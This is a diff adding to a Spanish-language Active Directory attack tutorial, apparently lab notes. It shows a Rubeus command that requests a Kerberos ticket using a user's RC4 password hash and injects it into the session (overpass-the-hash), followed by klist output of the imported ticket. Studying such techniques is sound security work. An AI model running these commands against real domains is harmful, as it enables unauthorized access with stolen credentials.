@@ -116,3 +116,23 @@ Para solicitar el TGT concociendo el *Hash* del usuario:
 ```powershell
 C:\AD\Tools\Rubeus.exe asktgt /user:juan /domain:cs.org /rc4:709d4242de780b1f34c19c78ad1630fd /dc:192.168.1.155 /ptt
 ```
+Al listar el *ticket*, solo se tendrá el recién importado:
+```powershell
+PS C:\Users\ffff> klist
+
+Current LogonId is 0:0x7f0cb
+
+Cached Tickets: (1)
+
+#0>     Client: juan @ CS.ORG
+        Server: krbtgt/cs.org @ CS.ORG
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
+        Start Time: 6/26/2024 12:35:32 (local)
+        End Time:   6/26/2024 22:35:32 (local)
+        Renew Time: 7/3/2024 12:35:32 (local)
+        Session Key Type: RSADSI RC4-HMAC(NT)
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called:
+```
+Al consumir el servicio CIF, se creará el TGS, Windows hará el trabajo.
